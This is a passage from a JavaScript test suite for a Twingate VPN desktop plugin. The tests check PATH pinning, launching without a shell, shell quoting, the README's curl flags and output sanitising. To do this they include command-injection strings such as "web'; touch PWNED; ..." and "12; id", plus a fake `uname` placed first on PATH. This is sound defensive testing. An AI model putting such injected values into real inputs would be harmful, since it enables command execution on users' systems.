  // match, so the script takes its no-build branch and never reaches curl --
  // which keeps this test off the network while still proving which `uname`
  // actually ran.
  const os = require("node:os"), cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-path-"))
  fs.writeFileSync(path.join(dir, "uname"), "#!/bin/bash\necho PWNEDARCH\n")
  fs.chmodSync(path.join(dir, "uname"), 0o755)
  const script = renderInstallScript({
    mips64: { file: "nope.pkg.tar.zst", sha256: "0".repeat(64), bytes: 1 }
  })
  fs.writeFileSync(path.join(dir, "i.sh"), script)
  const out = cp.execFileSync("bash", [path.join(dir, "i.sh")], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8" })
  fs.rmSync(dir, { recursive: true, force: true })
  assert.ok(!out.includes("PWNEDARCH"), "the installer used a shadowed uname from PATH")
  assert.ok(out.includes(os.arch() === "x64" ? "x86_64" : os.arch()),
    `expected the real architecture in: ${out.trim()}`)
})

test("every interaction copies the same thing for a given row", () => {
  // A wildcard is not browser-openable, yet every interaction must still copy
  // its address, as the README promises.
  const wildcard = { name: "corp wildcard", address: "*.corp.internal" }
  assert.equal(Model.resourceAddress(wildcard), "", "fixture must be non-openable")
  assert.equal(Model.clipboardValue(wildcard), "*.corp.internal")
  assert.equal(Model.clipboardValue({ name: "web", address: "web.corp.internal" }),
    "web.corp.internal")
  // Only when there is no address at all does the name stand in.
  assert.equal(Model.clipboardValue({ name: "label only", address: "" }), "label only")
  assert.equal(Model.clipboardValue(null), "")
  // And both callers must delegate to the shared rule.
  const PANEL = fs.readFileSync(path.join(__dirname, "..", "Panel.qml"), "utf8")
  for (const [file, src] of [["Panel.qml", PANEL], ["Service.qml", SERVICE]]) {
    assert.ok(/Model\.clipboardValue\(/.test(src),
      `${file} does not use the shared clipboard rule`)
    // Call sites only -- `function copyToClipboard(value)` is the definition.
    for (const call of src.match(/(?<!function )copyToClipboard\([^)]*\)/g) || []) {
      assert.ok(/Model\.clipboardValue\(/.test(call),
        `${file} copies something other than the shared value: ${call}`)
    }
  }
})

test("the README's manual install matches the hardened installer", () => {
  // Documented commands are copy-pasted. Shipping the rejected transfer
  // behaviour in prose undoes the fix for everyone who follows the README.
  const readme = fs.readFileSync(path.join(__dirname, "..", "README.md"), "utf8")
  // Spans backslash line-continuations, or it silently checks only the first
  // line and every flag on the continuation goes unverified.
  const curls = readme.match(/curl (?:[^\n]*\\\n)*[^\n]*/g) || []
  assert.ok(curls.length >= 2, `expected a curl per architecture, saw ${curls.length}`)
  for (const c of curls) {
    assert.ok(/--proto '=https'/.test(c), `README curl lacks a scheme restriction: ${c}`)
    assert.ok(/--proto-redir '=https'/.test(c), `README curl allows a redirect downgrade: ${c}`)
    assert.ok(/--max-filesize \d+/.test(c), `README curl has no transfer ceiling: ${c}`)
  }
  // The documented ceilings must be the real pinned sizes, not invented ones.
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    assert.ok(readme.includes("--max-filesize " + Model.CLIENT_BUILDS[arch].bytes),
      `README does not document the pinned size for ${arch}`)
  }
})

test("a failed resource listing is never silent", () => {
  // Failures can exit non-zero with empty stderr -- `timeout` killing a
  // wedged CLI is one -- and must still mark the list stale.
  const body = SERVICE.slice(SERVICE.indexOf("id: resourcesProcess"))
    .slice(0, SERVICE.slice(SERVICE.indexOf("id: resourcesProcess")).indexOf("\n  }"))
  assert.ok(/twingate resources failed/.test(body),
    "no fallback message for a failure that produced no stderr")
  assert.ok(!/if \(rerr !== ""\) root\.lastError/.test(body),
    "lastError is still conditional on stderr having text")
  assert.ok(/root\.lastError = rerr/.test(body), "lastError is never assigned")
})

// ── Where tenant data LEAVES the process ─────────────────────────────
// The auto-opened sign-in URL, the resource browser launch and the clipboard
// are where tenant-controlled data crosses out of the plugin. None of them
// goes through a shell.

function runExit(fnName, arg) {
  const launches = []
  const self = {
    authUrl: "", _openedAuthUrl: "", resources: [],
    Quickshell: { execDetached: (argv) => launches.push(argv) },
    Util: { shellQuote: (x) => "'" + String(x).replace(/'/g, "'\\''") + "'" },
    Model
  }
  const body = ["openAuthUrl", "openResource", "copyToClipboard"]
    .map(extractFunction).join("\n")
  const fn = new Function("self", `
    with (self) { ${body}; return { openAuthUrl, openResource, copyToClipboard } }
  `)(self)
  return { self, launches, fn }
}

test("a browser is never launched through a shell", () => {
  // argv, not a shell string. Resource names and addresses come from whoever
  // administers the Twingate network.
  const { self, launches, fn } = runExit()
  self.authUrl = "https://x.twingate.com/login?t=1"
  fn.openAuthUrl()
  fn.openResource({ name: "n", address: "web.corp.internal" })
  assert.equal(launches.length, 2, "expected two launches")
  for (const argv of launches) {
    assert.ok(Array.isArray(argv), "launch was not an argv array")
    assert.ok(!argv.some(x => /(?:^|\/)bash$|(?:^|\/)sh$/.test(x)) && !argv.includes("-c"),
      `browser launched through a shell: ${JSON.stringify(argv)}`)
    assert.equal(argv[0], "/usr/bin/omarchy-launch-browser")
    assert.equal(argv.length, 2, "extra arguments reached the launcher")
  }
})

test("the clipboard path passes tenant-controlled text as literal argv", () => {
  const { launches, fn } = runExit()
  const hostile = "web'; touch PWNED; echo '.corp.internal"
  fn.copyToClipboard(hostile)
  const argv = launches[0]
  assert.deepEqual(argv, ["/usr/bin/wl-copy", "--", hostile])
  assert.ok(!argv.some(x => /(?:^|\/)bash$|(?:^|\/)sh$/.test(x)),
    "clipboard data still reaches a shell")
  // And an empty value must launch nothing at all.
  const e = runExit(); e.fn.copyToClipboard("")
  assert.equal(e.launches.length, 0, "an empty clipboard value still spawned a process")
})

test("auto-open attribution accepts only a fresh plugin connect", () => {
  // The one path that opens a browser with no user action, so a sign-in the
  // plugin did not start -- `twingate start` in your own terminal -- must not
  // open a tab.
  assert.ok(/function shouldArmAutoOpen\(/.test(source),
    "the auto-open decision is not isolated for behavioral testing")
  const shouldArm = Model.shouldArmAutoOpen
  const now = 500000
  assert.equal(shouldArm("authenticating", "offline", now - 1000, now), true)
  assert.equal(shouldArm("authenticating", "offline", 0, now), false,
    "an auth with no plugin connect was attributed to the plugin")
  assert.equal(shouldArm("authenticating", "offline",
    now - Model.AUTO_OPEN_WINDOW_MS - 1, now), false,
    "an expired connect still armed the browser")
  assert.equal(shouldArm("authenticating", "authenticating", now - 1000, now), false,
    "a steady authenticating poll re-armed the browser")
  assert.equal(shouldArm("online", "offline", now - 1000, now), false)
  assert.ok(Model.AUTO_OPEN_WINDOW_MS > 0 && Model.AUTO_OPEN_WINDOW_MS <= 300000,
    "the attribution window is unbounded or absurd")

  const arming = SERVICE.match(/if \(Model\.shouldArmAutoOpen\([\s\S]*?\{[\s\S]{0,160}?root\._autoOpenArmed = true/)
  assert.ok(arming, "the status handler bypasses the tested attribution rule")
  assert.ok(/root\._connectLaunchMs\s*=\s*0/.test(arming[0]),
    "connect attribution is not consumed when it arms the browser")
  // It must still be one-shot, and still refuse to reopen the same URL.
  const open = SERVICE.match(/if \(root\.authUrl !== ""[^\n]*\)[\s\S]{0,200}?openAuthUrl\(\)/)
  assert.ok(open, "the auto-open call could not be found")
  assert.ok(/_autoOpenArmed/.test(open[0]), "the auto-open guard is gone")
  assert.ok(/_openedAuthUrl/.test(open[0]), "the same URL can be reopened every poll")
})

test("only successful connect actions create auto-open attribution", () => {
  assert.ok(/property double _connectLaunchMs: 0/.test(SERVICE),
    "there is no connect-specific attribution state")
  const launchBody = extractFunction("_launchConnect")
  const run = (launched) => {
    const self = {
      _connectLaunchMs: 0,
      _runAction: () => launched
    }
    const result = new Function("self", "Date", `
      with (self) { ${launchBody}; return _launchConnect("command") }
    `)(self, { now: () => 123456 })
    return { self, result }
  }
  const yes = run(true)
  assert.equal(yes.result, true)
  assert.equal(yes.self._connectLaunchMs, 123456,
    "a successful connect did not create attribution")
  const no = run(false)
  assert.equal(no.result, false)
  assert.equal(no.self._connectLaunchMs, 0,
    "a refused connect created attribution")

  assert.ok(/_launchConnect\(/.test(extractFunction("connectNetwork")),
    "connectNetwork bypasses connect attribution")
  for (const fn of ["disconnectNetwork", "signOut", "installClient", "authenticateResource"])
    assert.ok(!/_launchConnect\(/.test(extractFunction(fn)),
      `${fn} incorrectly creates connect attribution`)
})

test("the sign-in URL is parsed from stdout only", () => {
  // stderr is forbidden for normalizeStatus precisely because tenant-supplied
  // diagnostics must not be read as state. This consumer hands a URL to a
  // browser with no user action, so it gets at least the same rule.
  const handler = SERVICE.slice(SERVICE.indexOf("id: verboseProcess"))
  // The onExited BODY only -- the collector declarations above it legitimately
  // name verboseStderr, and matching those tests nothing.
  const body = handler.slice(handler.indexOf("onExited:"), handler.indexOf("\n  }"))
  assert.ok(/parseAuthUrl\(out\)/.test(body), "parseAuthUrl call not found")
  assert.ok(!/verboseStderr/.test(body),
    "stderr still feeds the URL that gets opened in a browser")
})

test("every terminal script pins PATH", () => {
  // The RENDERED scripts, not the source: source order proves nothing about
  // what runs.
  const scripts = {
    installClient: renderInstallScript(),
    authenticateResource: renderAuthScript("web").script
  }
  for (const [fn, script] of Object.entries(scripts)) {
    assert.ok(/^PATH=\/usr\/bin:\/bin$/m.test(script), `${fn} does not pin PATH`)
    assert.ok(/^export PATH$/m.test(script), `${fn} does not export the pin`)
    assert.ok(/(?:sudo pacman|twingate auth)/.test(script),
      `${fn} fixture reached no action; test proves nothing`)
    assert.ok(script.indexOf("PATH=/usr/bin:/bin") < script.search(/sudo pacman|twingate auth/),
      `${fn} runs its action before pinning PATH`)
  }
})

// Runs the REAL authenticateResource() with runInTerminal stubbed.
function renderAuthScript(name, overrides) {
  let captured = null
  const self = Object.assign({
    connected: true,
    Model,
    Util: { shellQuote: (x) => "'" + String(x || "").replace(/'/g, "'\\''") + "'" },
    runInTerminal: (script, tracksState) => { captured = { script, tracksState }; return true }
  }, overrides || {})
  const fn = new Function("self", `with (self) { ${extractFunction("authenticateResource")}; return authenticateResource }`)(self)
  const result = fn({ name, address: "10.0.0.1", alias: "", authStatus: "Not authenticated", exactName: true, ...(overrides && overrides.resource) })
  return { result, script: captured ? captured.script : null, tracksState: captured ? captured.tracksState : undefined }
}

test("non-interactive launches do not resolve security-sensitive tools through user PATH", () => {
  // The shell that owns the bar can inherit an interactive PATH containing
  // user-writable directories. These are fixed Omarchy/Arch dependencies, so
  // resolving them through that PATH buys nothing and lets a shadow binary
  // interpose on CLI output, a browser launch, or a terminal action.
  const cmd = bounded.fn(["tgstub"])
  assert.deepEqual(cmd.slice(0, 2), ["/usr/bin/env", "-u"])
  assert.ok(cmd.includes("/usr/bin/timeout"), "timeout is resolved through PATH")
  assert.ok(cmd.includes("/usr/bin/bash"), "bash is resolved through PATH")
  assert.ok(cmd[cmd.length - 1].includes("/usr/bin/head -c"),
    "head is resolved through PATH")

  for (const fn of ["refreshStatus", "refreshAuthUrl", "refreshResources", "refreshAccount",
                    "connectNetwork", "disconnectNetwork", "signOut"])
    assert.ok(/"\/usr\/bin\/twingate"/.test(extractFunction(fn)),
      `${fn} resolves the vendor CLI through PATH`)

  assert.ok(/\["\/usr\/bin\/test", "-x", "\/usr\/bin\/twingate"\]/
    .test(extractFunction("refresh")), "client detection resolves through PATH")
  assert.ok(/\/usr\/bin\/omarchy-launch-floating-terminal-with-presentation/
    .test(extractFunction("runInTerminal")), "terminal launcher resolves through PATH")
  assert.ok(/\/usr\/bin\/omarchy-launch-browser/.test(extractFunction("openAuthUrl")))
  assert.ok(/\/usr\/bin\/omarchy-launch-browser/.test(extractFunction("openResource")))
  assert.ok(/\/usr\/bin\/wl-copy/.test(extractFunction("copyToClipboard")))
  assert.ok(!/(?:bash|shellQuote)/.test(extractFunction("copyToClipboard")),
    "clipboard data still reaches the shell or its quoting helper")
})

test("the wrapper validates both bounds it renders, not just command argv", () => {
  // READ_LIMIT is pasted into the shell string and CLI_TIMEOUT_SEC becomes a
  // duration argument. "It is a constant" is the argument this plugin already
  // rejected for CLIENT_VERSION and CLIENT_BUILDS.bytes.
  const body = extractFunction("_bounded")
  assert.ok(/CLI_TIMEOUT_SEC/.test(body) && /READ_LIMIT/.test(body))
  const guard = body.slice(body.indexOf("var n = Model.READ_LIMIT"))
  assert.ok(/test\(String\(n\)\)/.test(guard) || /\$\/\.test\(String\(n\)\)/.test(guard),
    "READ_LIMIT is interpolated without validation")
  assert.ok(/test\(String\(seconds\)\)/.test(guard),
    "the deadline is interpolated without validation")
  // Executed as well: a malformed deadline, default or passed, renders nothing.
  const poisoned = new Function("Model", "_log", body + "; return _bounded")(
    Object.assign(Object.create(null), Model, { CLI_TIMEOUT_SEC: "12; id" }), () => {})
  assert.deepEqual(poisoned(["twingate", "status"]), [], "a malformed default deadline was rendered")
  assert.deepEqual(bounded.fn(["twingate", "status"], "0"), [], "a zero deadline was rendered")
})

// ── Two guards that a source grep could not actually see ─────────────
// Grepping a region proves a token is nearby, not that it is load-bearing, so
// these execute the handler and the launcher instead.

// Pulls the body of a Process's onExited handler so it can be run directly.
function extractHandler(processId) {
  const from = SERVICE.slice(SERVICE.indexOf("id: " + processId))
  // Both signatures Quickshell accepts: (exitCode) and (exitCode, exitStatus).
  const sig = from.match(/onExited: function\((?:exitCode|exitCode, exitStatus)\) \{/)
  const src = from.slice(sig.index + sig[0].length - 2)
  let depth = 0, i = src.indexOf("{"), seen = false
  while (i < src.length) {
    const c = src[i], n = src[i + 1]
    if (c === "/" && n === "/") { const nl = src.indexOf("\n", i); i = nl === -1 ? src.length : nl; continue }
    if (c === '"' || c === "'") { i++; while (i < src.length && src[i] !== c) i += src[i] === "\\" ? 2 : 1; i++; continue }
    if (c === "{") { depth++; seen = true }
    else if (c === "}") { depth--; if (seen && depth === 0) { i++; break } }
    i++
  }
  return src.slice(src.indexOf("{"), i)
}

function runVerboseHandler(state) {
  const opened = []
  const root = Object.assign({
    authUrl: "", _openedAuthUrl: "", _autoOpenArmed: false,
    _disarmPollWatchdogIfIdle() {},
    openAuthUrl() { opened.push(this.authUrl); this._openedAuthUrl = this.authUrl }
  }, state)
  const verboseStdout = { text: state.stdout || "" }
  const body = extractHandler("verboseProcess")
  new Function("root", "verboseStdout", "Model", `(function(exitCode)${body})(0)`)(
    root, verboseStdout, Model)
  return { root, opened }
}

const SIGNIN = "Visit the following URL to authenticate:\nhttps://x.twingate.com/login?t=1"

test("the browser is not opened for an auth this plugin did not start", () => {
  // Unarmed, the URL is parsed and shown but no browser opens.
  const { root, opened } = runVerboseHandler({ stdout: SIGNIN, _autoOpenArmed: false })
  assert.equal(root.authUrl, "https://x.twingate.com/login?t=1",
    "the URL must still be parsed and shown")
  assert.deepEqual(opened, [], "a browser was opened with no plugin-initiated connect")
})

test("an armed auth opens exactly once, and never reopens the same URL", () => {
  const { root, opened } = runVerboseHandler({ stdout: SIGNIN, _autoOpenArmed: true })
  assert.deepEqual(opened, ["https://x.twingate.com/login?t=1"], "the armed auth did not open")
  assert.equal(root._autoOpenArmed, false, "the permission was not consumed")

  // Same URL again, still armed: must not reopen.
  const again = runVerboseHandler({
    stdout: SIGNIN, _autoOpenArmed: true, _openedAuthUrl: "https://x.twingate.com/login?t=1"
  })
  assert.deepEqual(again.opened, [], "the same sign-in URL was opened twice")
})

test("the terminal launcher passes its script as one quoted argument", () => {
  // The installer and resource authentication both go through here, and one
  // of them carries a tenant-controlled resource name.
  const body = extractFunction("runInTerminal")
  let launched = null
  const self = {
    minLaunchGapMs: 5000, _lastLaunchMs: 0, _connectLaunchMs: 0, actionPending: false,
    lastError: "", connectionState: "online", _stateAtAction: "", now: 1000000,
    bar: { run: (c) => { launched = c } },
    settleTimer: { elapsed: 0, restart() {} }, _log() {}
  }
  const fn = new Function("self", "Util", `
    const Date = { now: () => self.now }
    with (self) { ${body}; return runInTerminal }
  `)(self, { shellQuote: (x) => "'" + String(x).replace(/'/g, "'\\''") + "'" })

  const nasty = "echo hi; touch /tmp/PWNED_$(id -u) # it's a trap"
  fn(nasty)
  assert.ok(launched, "nothing was launched")
  const prefix = "/usr/bin/omarchy-launch-floating-terminal-with-presentation "
  assert.ok(launched.startsWith(prefix), `unexpected launcher: ${launched}`)

  // Ask a real shell to word-split it: the script must survive as exactly ONE
  // argument, byte-identical. That is what quoting has to guarantee, and no
  // string match on the source can establish it.
  const cp = require("node:child_process")
  const r = cp.spawnSync("bash", ["-c",
    `set -- ${launched.slice(prefix.length)}; printf '%s' "$#"; printf '\\0'; printf '%s' "$1"`],
    { encoding: "utf8", timeout: 10000 })
  const [count, arg] = r.stdout.split("\0")
  assert.equal(count, "1", `the script split into ${count} shell words`)
  assert.equal(arg, nasty, "the script was mangled or partially interpreted")
})

test("a terminal action that does not move the connection leaves the switch free", () => {
  const h = makeHost()
  assert.equal(h.runInTerminal("twingate auth -- 'x'", false), true)
  assert.equal(h.launches.length, 1)
  assert.equal(h.actionPending, false, "authenticating a resource held the switch busy")
  h.now += h.minLaunchGapMs - 1
  assert.equal(h.runInTerminal("x", false), false, "the launch floor no longer applies")
})

// ── Actions without a terminal ────────────────────────────────────────

test("actionFailure stays quiet for a dismissed prompt and explains everything else", () => {
  for (const kind of Model.PKEXEC_ACTIONS)
    assert.equal(Model.actionFailure(kind, 126, "Error executing command as another user: Request dismissed"), "",
      `${kind}: a dismissed prompt was reported as an error`)
  // 126 from a command that is not pkexec is a real failure.
  assert.notEqual(Model.actionFailure("install", 126, ""), "")
  assert.equal(Model.actionFailure("connect", 0, "anything"), "")
  assert.match(Model.actionFailure("disconnect", 137, ""), /Timed out trying to disconnect/)
  assert.equal(Model.actionFailure("connect", 127,
    "\n" + ESC + "[31mError executing command as another user: Not authorized" + ESC + "[0m\n"),
    "Error executing command as another user: Not authorized")
  assert.equal(Model.actionFailure("sign-out", 1, "   \n"), "Could not sign out")
  assert.equal(Model.actionFailure("disconnect", 1, "bad‮line\r"), "badline")
})

test("parseAccount reads the signed-in account from real output", () => {
  // Shape captured from a real client, address and network replaced.
  const real = "Currently signed in as user@example.com - acme (twingate.com)\nnot-running\n"
  assert.deepEqual(Model.parseAccount(real), { email: "user@example.com", network: "acme" })
  // A network name with spaces, a dash or parentheses of its own survives;
  // only the final controller-domain group is dropped.
  assert.deepEqual(Model.parseAccount("Currently signed in as a@b.co - Acme - EU (Prod) (twingate.com)"),
    { email: "a@b.co", network: "Acme - EU (Prod)" })
  assert.deepEqual(Model.parseAccount("Currently signed in as a@b.co - acme"),
    { email: "a@b.co", network: "acme" })
})

test("parseAccount reads anything else as signed out", () => {
  const none = { email: "", network: "" }
  for (const raw of ["", null, "not-running", 'Please run "twingate setup" first',
                     "Currently signed in as  - acme (x)", "Currently signed in as a b - acme (x)"])
    assert.deepEqual(Model.parseAccount(raw), none, JSON.stringify(raw))
  const hostile = Model.parseAccount("Currently signed in as a@b.co - ac‮me (twingate.com)")
  assert.equal(hostile.network, "acme")
  assert.ok(Model.parseAccount("Currently signed in as a@b.co - " + "x".repeat(5000)).network.length < 4096,
    "the network name is not bounded")
})

test("only the CLI's exact locked wording offers authentication", () => {
  assert.equal(Model.isLockedAuthStatus("Not authenticated"), true)
  assert.equal(Model.isLockedAuthStatus("  not authenticated "), true)
  for (const s of ["", null, "Auth expires in 4 days", "Not authenticated yet", "Pending"])
    assert.equal(Model.isLockedAuthStatus(s), false, String(s))
})

test("filterResources matches name, address and alias, case-insensitively", () => {
  const r = Model.parseResources(REAL)
  assert.equal(Model.filterResources(r, ""), r, "an empty query must return the list itself")
  assert.equal(Model.filterResources(r, "   "), r)
  assert.deepEqual(Model.filterResources(r, "JELLY").map(x => x.name), ["Jellyfin"])
  assert.deepEqual(Model.filterResources(r, "192.0.2.40").map(x => x.name), ["Twingate Connector 2"])
  assert.equal(Model.filterResources([{ name: "a", address: "b", alias: "db.internal" }], "db.int").length, 1)
  assert.deepEqual(Model.filterResources(r, "nothing-matches"), [])
  assert.deepEqual(Model.filterResources(null, "x"), [])
  assert.ok(Model.SEARCH_MIN_RESOURCES > 1, "a search box for a single resource is chrome")
})

// Runs a REAL launcher with _runAction stubbed to record what it was asked.
function runLauncher(fnName, overrides) {
  const calls = []
  const host = Object.assign({
    installed: true, signedIn: true, _connectLaunchMs: 0,
    _runAction: (kind, argv, answer) => {
      const call = { kind, argv }
      if (answer !== undefined) call.answer = answer
      calls.push(call)
      return true
    }
  }, overrides || {})
  host._launchConnect = new Function("self",
    `with (self) { ${extractFunction("_launchConnect")}; return _launchConnect }`)(host)
  const fn = new Function("self", `with (self) { ${extractFunction(fnName)}; return ${fnName} }`)(host)
  return { result: fn(), calls, host }
}

test("connect and disconnect elevate through pkexec, with no terminal", () => {
  const c = runLauncher("connectNetwork")
  assert.deepEqual(c.calls, [{ kind: "connect", argv: ["/usr/bin/pkexec", "/usr/bin/twingate", "connect"] }])
  assert.ok(c.host._connectLaunchMs > 0, "a launched connect did not create browser attribution")
  const d = runLauncher("disconnectNetwork")
  assert.deepEqual(d.calls, [{ kind: "disconnect", argv: ["/usr/bin/pkexec", "/usr/bin/twingate", "disconnect"] }])
  for (const fn of ["connectNetwork", "disconnectNetwork", "signOut"])
    assert.ok(!/runInTerminal|bar\.run/.test(extractFunction(fn)), `${fn} still opens a terminal`)
})

test("signing out elevates, answers the confirmation, and names no account", () => {
  const s = runLauncher("signOut")
  assert.deepEqual(s.calls, [{ kind: "sign-out", argv: ["/usr/bin/pkexec", "/usr/bin/twingate", "account", "logout", "-d"], answer: "y" }],
    "sign-out must answer the CLI's confirmation, or it waits for the whole deadline")
  assert.equal(runLauncher("signOut", { signedIn: false }).calls.length, 0, "signed out, yet sign-out launched")
  assert.equal(runLauncher("signOut", { installed: false }).calls.length, 0)
})

test("nothing in the plugin changes what happens at boot", () => {
  // Whether Twingate connects after a reboot is the client's own autostart
  // setting, and off is the intended default. Measured: the unit started at
  // boot with autostart 0 and the client stayed off, so enabling the unit
  // would not even have done what an offer to "start at boot" promised.
  for (const src of [SERVICE, PANEL])
    assert.ok(!/systemctl|config autostart/.test(src), "the plugin changes boot behaviour")
})

test("the switch connects from any off state, including a stopped daemon", () => {
  const body = extractFunction("toggleConnection")
  const run = (state) => {
    const calls = []
    const self = {
      installed: true, connected: state === "online", connecting: state === "authenticating", _desired: -1,
      connectNetwork: () => { calls.push("connect"); return true },
      disconnectNetwork: () => { calls.push("disconnect"); return true }
    }
    const result = new Function("self", `with (self) { ${body}; return toggleConnection() }`)(self)
    return { result, calls, desired: self._desired }
  }
  assert.deepEqual(run("not-running"), { result: "ok", calls: ["connect"], desired: 1 })
  assert.deepEqual(run("offline"), { result: "ok", calls: ["connect"], desired: 1 })
  assert.deepEqual(run("online"), { result: "ok", calls: ["disconnect"], desired: 0 })
  assert.deepEqual(run("authenticating"), { result: "ok", calls: ["disconnect"], desired: 0 })
})

function makeActionHost(overrides) {
  const host = Object.assign({
    actionProcess: { running: false, command: null },
    actionPending: false, actionError: "stale", lastError: "", connectionState: "not-running",
    _actionKind: "", _stateAtAction: "", _connectLaunchMs: 5, logged: [], Model
  }, overrides || {})
  host._log = (m) => host.logged.push(m)
  host._bounded = (argv, t) => bounded.fn(argv, t)
  host._runAction = new Function("self",
    `with (self) { ${extractFunction("_runAction")}; return _runAction }`)(host)
  return host
}

test("an action runs one at a time, bounded, and refuses visibly", () => {
  const h = makeActionHost()
  assert.equal(h._runAction("connect", ["/usr/bin/pkexec", "/usr/bin/twingate", "connect"]), true)
  assert.equal(h.actionProcess.running, true)
  const cmd = h.actionProcess.command
  assert.equal(cmd[cmd.indexOf("--signal=KILL") + 1], String(Model.ACTION_TIMEOUT_SEC),
    "the action is not bounded by its own deadline")
  assert.ok(cmd[cmd.length - 1].includes("/usr/bin/pkexec /usr/bin/twingate connect"))
  assert.equal(h.actionPending, true)
  assert.equal(h.actionError, "", "a new action kept the previous failure on screen")
  assert.equal(h._connectLaunchMs, 0, "an action left older connect attribution in place")
  assert.equal(h._actionKind, "connect")

  assert.equal(h._runAction("disconnect", ["/usr/bin/pkexec", "/usr/bin/twingate", "disconnect"]), false)
  assert.equal(h._actionKind, "connect", "a refused action replaced the running one")
  assert.match(h.actionError, /still running/, "the refusal was silent")

  const bad = makeActionHost()
  assert.equal(bad._runAction("connect", ["/bin/sh", "-c", "id"]), false)
  assert.equal(bad.actionProcess.running, false)
  assert.equal(bad.actionPending, false, "a refused command still held the switch busy")
  assert.match(bad.actionError, /Could not run/, "a refused command was silent")
})

// Runs the REAL onExited handler of the action process.
function runActionHandler(exitCode, state) {
  const settle = { elapsed: 99, restarted: 0, stopped: 0,
    restart() { this.restarted++ }, stop() { this.stopped++ } }
  const root = Object.assign({
    _actionKind: "connect", actionPending: true, _desired: 1, _connectLaunchMs: 7,
    actionError: "", refreshed: 0, logged: [], connected: false, daemonDown: false,
    refresh() { this.refreshed++ }, _log(m) { this.logged.push(m) }
  }, state)
  new Function("root", "settleTimer", "actionStdout", "actionStderr", "Model",
    `(function(exitCode, exitStatus)${extractHandler("actionProcess")})(${exitCode}, ${state.exitStatus || 0})`)(
    root, settle, { text: state.stdout || "" }, { text: state.stderr || "" }, Model)
  return { root, settle }
}

test("a dismissed prompt returns the switch quietly", () => {
  const { root, settle } = runActionHandler(126,
    { stderr: "Error executing command as another user: Request dismissed" })
  assert.equal(root.actionError, "", "dismissing the prompt was reported as an error")
  assert.equal(root.actionPending, false)
  assert.equal(root._desired, -1, "the switch kept asserting an intent that was cancelled")
  assert.equal(root._connectLaunchMs, 0, "a cancelled connect kept its browser attribution")
  assert.equal(settle.stopped, 1)
})

test("a deadline kill reads as a timeout, not a failure code", () => {
  // Measured live: Quickshell reported the 300-second deadline as a crash
  // with exit code 9 (SIGKILL), and the panel said "Could not sign out".
  const { root, settle } = runActionHandler(9, { _actionKind: "sign-out", exitStatus: 1 })
  assert.equal(root.actionError, "Timed out trying to sign out")
  assert.equal(root.actionPending, false, "a timed-out action kept the switch busy")
  assert.equal(settle.stopped, 1)
  // A plain exit code 9 is still reported as the command's own failure.
  const plain = runActionHandler(9, { _actionKind: "sign-out", stderr: "logout failed" })
  assert.equal(plain.root.actionError, "logout failed")
})

test("a failed action says why, sanitised", () => {
  const { root } = runActionHandler(1,
    { _actionKind: "sign-out", stderr: ESC + "[31mlogout fai‮led" + ESC + "[0m\nmore" })
  assert.equal(root.actionError, "logout failed")
  assert.equal(root.actionPending, false)
  assert.equal(root.refreshed, 1)
})

test("a successful action keeps the switch busy until the state moves", () => {
  const { root, settle } = runActionHandler(0, {})
  assert.equal(root.actionPending, true, "success released the switch before the new state was seen")
  assert.equal(root._desired, 1)
  assert.equal(settle.restarted, 1, "no settle polling after a successful action")
  assert.equal(root.refreshed, 1)
})

test("a successful sign-out releases the switch at once", () => {
  // Signing out leaves the connection state where it was, so nothing would
  // ever end the settle window early and every toggle would be refused.
  const { root, settle } = runActionHandler(0, { _actionKind: "sign-out", _desired: -1 })
  assert.equal(root.actionPending, false, "a finished sign-out kept the switch busy")
  assert.equal(root._desired, -1)
  assert.equal(settle.restarted, 0, "a sign-out started settle polling it can never end")
  assert.equal(root.refreshed, 1, "the account row was not refreshed after signing out")
})

test("a successful action whose result is already visible releases the switch", () => {
  const connect = runActionHandler(0, { _actionKind: "connect", connected: true })
  assert.equal(connect.root.actionPending, false, "connecting while connected held the switch busy")
  assert.equal(connect.settle.restarted, 0)
  const disconnect = runActionHandler(0, { _actionKind: "disconnect", daemonDown: true })
  assert.equal(disconnect.root.actionPending, false, "disconnecting while off held the switch busy")
  // Still waiting when the result is not visible yet.
  const pending = runActionHandler(0, { _actionKind: "disconnect", daemonDown: false })
  assert.equal(pending.root.actionPending, true)
  assert.equal(pending.settle.restarted, 1)
})

// Runs the REAL onExited handler of the status process.
function runStatusHandler(stdout, state) {
  const settle = { stopped: 0, stop() { this.stopped++ } }
  const root = Object.assign({
    lastError: "", actionError: "", _lastState: "", _connectLaunchMs: 0, _autoOpenArmed: false,
    actionPending: false, _stateAtAction: "", _desired: -1, connectionState: "unknown",
    authUrl: "", _openedAuthUrl: "",
    _disarmPollWatchdogIfIdle() {}, refreshAuthUrl() {}, refreshResources() {}, _log() {}
  }, state)
  const actionProcess = { running: state.actionRunning === true }
  new Function("root", "statusStdout", "statusStderr", "Model", "actionProcess", "settleTimer",
    `(function(exitCode)${extractHandler("statusProcess")})(0)`)(
    root, { text: stdout }, { text: "" }, Model, actionProcess, settle)
  return { root, settle }
}

test("an action's failure message clears once the state moves on", () => {
  const moved = runStatusHandler("online", { actionError: "Timed out trying to connect", _lastState: "not-running" })
  assert.equal(moved.root.actionError, "", "a stale failure stayed under a changed state")
  const same = runStatusHandler("not-running", { actionError: "Could not sign out", _lastState: "not-running" })
  assert.equal(same.root.actionError, "Could not sign out", "the poll right after a failure erased it")
  const running = runStatusHandler("online",
    { actionError: "x", _lastState: "not-running", actionRunning: true })
  assert.equal(running.root.actionError, "x", "a message cleared while an action was still running")
})

test("a status poll does not release the switch while the action still runs", () => {
  const during = runStatusHandler("online",
    { actionPending: true, _desired: 1, _stateAtAction: "not-running", actionRunning: true })
  assert.equal(during.root.actionPending, true, "a poll released the switch with the prompt still open")
  const after = runStatusHandler("online",
    { actionPending: true, _desired: 1, _stateAtAction: "not-running", actionRunning: false })
  assert.equal(after.root.actionPending, false, "the observed result did not release the switch")
  assert.equal(after.root._desired, -1)
  assert.equal(after.settle.stopped, 1)
})

test("a terminal launch clears an earlier action failure", () => {
  const h = makeHost({ actionError: "Timed out trying to connect" })
  assert.equal(h.runInTerminal("x", false), true)
  assert.equal(h.actionError, "", "a new action left the old failure on screen")
})

test("Authenticate is offered only for a name the CLI will recognise", () => {
  const exact = Model.parseResources("Billing API\t10.0.0.1\t-\tNot authenticated")
  assert.equal(exact[0].exactName, true)
  const invisible = Model.parseResources("Bill­ing\t10.0.0.1\t-\tNot authenticated")
  assert.equal(invisible[0].name, "Billing")
